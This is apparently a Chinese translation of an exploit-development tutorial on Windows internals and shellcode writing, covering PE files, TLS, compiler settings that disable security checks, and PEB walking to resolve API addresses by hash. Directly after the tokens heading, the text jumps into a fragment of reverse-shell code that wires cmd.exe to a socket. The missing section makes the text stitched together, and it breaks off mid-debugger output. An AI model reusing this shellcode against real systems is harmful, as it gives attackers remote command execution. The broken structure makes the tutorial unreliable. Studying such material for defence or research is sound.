# Exploit开发系列教程-Windows基础&shellcode

from:http://expdev-kiuhnm.rhcloud.com/2015/05/11/contents/

Windows基础
=========

* * *

### 0x00 Windows Basics

这篇文章简要讲述Windows开发者应该了解的一些常识。

### 0x01 Win32 API

Windows的主要API由多个DLLs（`Dynamic Link Libraries`）提供。某个应用可以从那些`DLL`中导入函数并且对它们进行调用。这样就保证了普通用户态应用程序的可移植性。

### 0x02 PE文件格式

执行体和`DLL`都是PE(`Portable Executable`)文件。每个PE含有一个导入和导出表。导入表指定导入函数以及这些函数所在的文件（模块）。导出表指定导出函数，等等。函数可以被导入到其它的PE文件。

`PE`文件由多个节（`section`）组成（代码节，数据节，等等…）。在内存中， `.reloc`节中具有重定位可执行体或`DLL`的信息。在内存中，虽然有些代码（例如相对的`jmp`指令）的地址是相对的，但是多数代码所在的地址是绝对的，这取决于被加载的模块。

`Windows loader`从当前工作目录开始搜索`DLLs`，发布的某个应用可能具有一个不同于系统根（`\windows\system32`）目录中的`DLL`。该版本方面的问题（不兼容）被一些人称作`DLL-hell`。

重要的是理解相对虚拟内存地址 (`Relative Virtual Address`，RVA)的概念。`PE`文件提供`RVAs`来指定模块的相对基地址。换句话说，在内存中，如果某个模块在地址B（基地址）上被加载并且某个元素在该模块中具有`RVA`为X这一偏移量，那么该元素的虚拟内存地址（`Virtual Address`，VA）偏移量为`B+X`。

### 0x03 线程

如果你过去经常使用Windows平台，那么应该非常了解线程的概念。但是，如果你经常使用的是Linux，那么请记住，Windows平台将会为线程提供`CPU`时间片。你可以用`CreateProcess()`创建新进程并且用`CreateThreads()`创建新线程。线程会在它们所在进程的地址空间内执行，因此它们所在的内存是共享的。

线程也会被一种称作TLS（`Thread Local Storage`）的机制限制，该机制为线程提供了非共享内存。

基本上，每个线程的`TEB`都含有一个`TLS`数组，它具有64个`DWORD`值，并且在运行过程中超出`TLS`数组的有效元素个数时，会为额外的`TLS`数组分配1024个`DWORD`值。首先，两个数组中的一个数组的每个元素会对应一个索引值，该索引值必须被分配或使用`TlsAlloc()`来得到，可以用`TlsGetValue`(index) 来读取`DWORD`值并用`TlsSetValue`(index, newValue)将其写入。如，在当前线程的`TEB`中，`TlsGetValue`(7)表示从`TLS`数组中索引值为7的地址上读取`DWORD`值。

笔记：我们可以通过使用`GetCurrentThreadId()`来模拟该机制，但是不会有一样的效果。

### 0x04 令牌


    sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE)sock;
    My_CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &procInfo);
 
    // Waits for the process to finish.
    My_WaitForSingleObject(procInfo.hProcess, INFINITE);
 
__end:
    My_ExitThread(0);
 
    return 0;
}
 
int main() {
    return entryPoint();
}

```

#### 编译器配置

通过`Project→<project name> properties`, 展开 `Configuration Properties`接着选择 `C/C++`。应用修改后的`Release`配置。

这里是需要修改的设置：

*   General:
    *   oSDL Checks: No (/sdl-)

这可能并不需要，但是我已将它们关闭了。

*   Optimization:
    *   Optimization: Minimize Size (/O1)

这很重要！我们得尽可能将`shellcode`简短。

```
* Inline Function Expansion: Only __inline (/Ob1)

```

使用这个设置告诉`VS 2013`只用`_inline`来定义内联函数。`main()` 仅调用`shellcode`的函数`entryPoint`。如果函数 `entryPoint`是简短的，那么它可能会被内联进`main()`。这将是极糟的，因为`main()`将不再透露`shellcode`的后一部分（事实上它包含了该部分）。后面会了解到原因。

```
* Enable Intrinsic Functions: Yes (/Oi)

```

我不知道该设置是否应该关闭。

```
* Favor Size Or Speed: Favor small code (/Os)

* Whole Program Optimization: Yes (/GL)

```

*   Code Generation:
    *   Security Check: Disable Security Check (/GS-)

不需要安全检查!

```
* Enable Function-Level linking: Yes (/Gy)

```

#### linker配置

通过`Project→<project name> properties`, 展开`Configuration Properties`接着查看`Linker`。应用修改后的`Release`配置。这里是你需要修改的相关设置：

*   General:
    *   Enable Incremental Linking: No (/INCREMENTAL:NO)
*   Debugging:
    *   Generate Map File: Yes (/MAP)

告诉`linker`生成含有`EXE`结构的映射文件。

```
* Map File Name: mapfile

```

这是映射文件名。可自定义文件名。

*   Optimization:
    *   References: Yes (/OPT:REF)

该选项对于生成简短的`shellcode`来说非常重要，因为可以除去函数以及不被代码引用的数据。

```
* Enable COMDAT Folding: Yes (/OPT:ICF)

* Function Order: function_order.txt

```

应用该设置读取命名为`function_order.txt` 的文件，该文件指定必须出现在代码节中函数的顺序。我们要将函数 `entryPoint`变为代码节中的第一个函数，可想而知，`function_order.txt`中必存在一行代码含有字符串`?entryPoint@@YAHXZ`。可以在映射文件中找到该函数名。

#### getProcAddrByHash

该函数返回由某个出现在内存中的模块（`.exe`或`.dll`）导出的某个函hash数的地址，已给出的``值与模块和函数相关联。当然，通过名字查找函数具有一定的可能性，但是这样做需要考虑空间方面的问题，因为那些名字应该被包含在`shellcode`中。在另一方面，一个`hash`仅有4个字节。因为我们不使用两个`hash`（一个用于模块，一个用于函数），`getProcAddrByHash`需要考虑所有被加载进内存中的模块。

通过`user32.dll`导出函数`MessageBoxA`，该函数的`hash`值可通过如下方法计算：

```
DWORD hash = getFunctionHash("user32.dll", "MessageBoxA");

```

计算出的`hash`值为`getHash`(“user32.dll”) 与`getHash`(“MessageBoxA”)的`hash`值的总和。函数`getHash`的实现简明易懂：

```
DWORD getHash(const char *str) {
    DWORD h = 0;
    while (*str) {
        h = (h >> 13) | (h << (32 - 13));       // ROR h, 13
        h += *str >= 'a' ? *str - 32 : *str;    // convert the character to uppercase
        str++;
    }
    return h;
}

```

正如你可以了解到的，`hash`值是大小写不敏感的（不区分大小写），重要的是，因为在内存中，某种Windows的版本所使用的字符串都为大写。 首先，`getProcAddrByHash`获取TEB(`Thread Environment Block`)的地址：

```
PEB *peb = getPEB();

where

_inline PEB *getPEB() {
    PEB *p;
    __asm {
        mov     eax, fs:[30h]
        mov     p, eax
    }
    return p;
}

```

选择子`fs`与某个始于`TEB`地址的段相关联。在偏移`30h`上，`TEB`含有一个PEB(`Process Environment Block`)指针。用WinDbg可以观察到：

```
0:000> dt _TEB @$teb
ntdll!_TEB
+0x000 NtTib            : _NT_TIB
+0x01c EnvironmentPointer : (null)
+0x020 ClientId         : _CLIENT_ID
+0x028 ActiveRpcHandle  : (null)
+0x02c ThreadLocalStoragePointer : 0x7efdd02c Void
+0x030 ProcessEnvironmentBlock : 0x7efde000 _PEB
+0x034 LastErrorValue   : 0
+0x038 CountOfOwnedCriticalSections : 0
+0x03c CsrClientThread  : (null)
<snip>

```

`PEB`与当前的进程相关联，除了别的以外，含有关于某些模块的信息，这些模块都被加载到进程地址空间中。 此处又是`getProcAddrByHash`：

```
PVOID getProcAddrByHash(DWORD hash) {
    PEB *peb = getPEB();
    LIST_ENTRY *first = peb->Ldr->InMemoryOrderModuleList.Flink;
    LIST_ENTRY *ptr = first;
    do {                            // for each module
        LDR_DATA_TABLE_ENTRY *dte = getDataTableEntry(ptr);
        ptr = ptr->Flink;
        .
        .
        .
    } while (ptr != first);
 
    return NULL;            // address not found
}

```

此处为`PEB`部分:

```
0:000> dt _PEB @$peb
ntdll!_PEB
   +0x000 InheritedAddressSpace : 0 ''
   +0x001 ReadImageFileExecOptions : 0 ''
   +0x002 BeingDebugged    : 0x1 ''
   +0x003 BitField         : 0x8 ''
   +0x003 ImageUsesLargePages : 0y0
   +0x003 IsProtectedProcess : 0y0
   +0x003 IsLegacyProcess  : 0y0
   +0x003 IsImageDynamicallyRelocated : 0y1
   +0x003 SkipPatchingUser32Forwarders : 0y0
   +0x003 SpareBits        : 0y000
   +0x004 Mutant           : 0xffffffff Void
   +0x008 ImageBaseAddress : 0x00060000 Void
   +0x00c Ldr              : 0x76fd0200 _PEB_LDR_DATA
   +0x010 ProcessParameters : 0x00681718 _RTL_USER_PROCESS_PARAMETERS
   +0x014 SubSystemData    : (null)
   +0x018 ProcessHeap      : 0x00680000 Void
   <snip>

```

在偏移`0Ch`上，是一个被称作`Ldr`的字段，它是个`PEB_LDR_DATA` 结构指针。使用`WinDbg`进行观察：

```
0:000> dt _PEB_LDR_DATA 0x76fd0200
ntdll!_PEB_LDR_DATA
   +0x000 Length           : 0x30
   +0x004 Initialized      : 0x1 ''
   +0x008 SsHandle         : (null)
   +0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x683080 - 0x6862c0 ]
   +0x014 InMemoryOrderModuleList : _LIST_ENTRY [ 0x683088 - 0x6862c8 ]
   +0x01c InInitializationOrderModuleList : _LIST_ENTRY [ 0x683120 - 0x6862d0 ]
   +0x024 EntryInProgress  : (null)
   +0x028 ShutdownInProgress : 0 ''
   +0x02c ShutdownThreadId : (null)

```

`InMemoryOrderModuleList`是一个`LDR_DATA_TABLE_ENTRY`结构的双链表，它与当前进程的地址空间中所加载的模块相关联。更确切地说，`InMemoryOrderModuleList` 是一个`LIST_ENTRY`，它含有两个部分：

```
0:000> dt _LIST_ENTRY
ntdll!_LIST_ENTRY
+0x000 Flink            : Ptr32 _LIST_ENTRY
+0x004 Blink            : Ptr32 _LIST_ENTRY

```

`Flink`为前向链表，`Blink`为后向链表。`Flink`指向第一个模块的`LDR_DATA_TABLE_ENTRY` 。当然，未必就是如此：

`Flink`指向一个被包含在结构`LDR_DATA_TABLE_ENTRY`中的`LIST_ENTRY`结构。

我们来观察`LDR_DATA_TABLE_ENTRY` 是如何被定义的:

```
0:000> dt _LDR_DATA_TABLE_ENTRY
ntdll!_LDR_DATA_TABLE_ENTRY
+0x000 InLoadOrderLinks : _LIST_ENTRY
+0x008 InMemoryOrderLinks : _LIST_ENTRY
+0x010 InInitializationOrderLinks : _LIST_ENTRY
+0x018 DllBase          : Ptr32 Void
+0x01c EntryPoint       : Ptr32 Void
+0x020 SizeOfImage      : Uint4B
+0x024 FullDllName      : _UNICODE_STRING
+0x02c BaseDllName      : _UNICODE_STRING
+0x034 Flags            : Uint4B
+0x038 LoadCount        : Uint2B
+0x03a TlsIndex         : Uint2B
+0x03c HashLinks        : _LIST_ENTRY
+0x03c SectionPointer   : Ptr32 Void
+0x040 CheckSum         : Uint4B
+0x044 TimeDateStamp    : Uint4B
+0x044 LoadedImports    : Ptr32 Void
+0x048 EntryPointActivationContext : Ptr32 _ACTIVATION_CONTEXT
+0x04c PatchInformation : Ptr32 Void
+0x050 ForwarderLinks   : _LIST_ENTRY
+0x058 ServiceTagLinks  : _LIST_ENTRY
+0x060 StaticLinks      : _LIST_ENTRY
+0x068 ContextInformation : Ptr32 Void
+0x06c OriginalBase     : Uint4B
+0x070 LoadTime         : _LARGE_INTEGER

```

`InMemoryOrderModuleList.Flink`指向位于偏移为8的`_LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks`，因此，我们必须减去8来获取 `_LDR_DATA_TABLE_ENTRY`的地址。

首先，获取Flink指针:

```
+0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x683080 - 0x6862c0 ]

```

它的值是`0x683080`，因此`_LDR_DATA_TABLE_ENTRY` 结构的地址为`0x683080 – 8 = 0x683078`:

```
0:000> dt _LDR_DATA_TABLE_ENTRY 683078
ntdll!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x359469e5 - 0x1800eeb1 ]
   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x683110 - 0x76fd020c ]
   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x683118 - 0x76fd0214 ]
   +0x018 DllBase          : (null)
   +0x01c EntryPoint       : (null)
   +0x020 SizeOfImage      : 0x60000
   +0x024 FullDllName      : _UNICODE_STRING "蒮ｍ쿟ﾹ엘ﾬ膪ｎ???"
   +0x02c BaseDllName      : _UNICODE_STRING "C:\Windows\SysWOW64\calc.exe"
   +0x034 Flags            : 0x120010
   +0x038 LoadCount        : 0x2034
   +0x03a TlsIndex         : 0x68
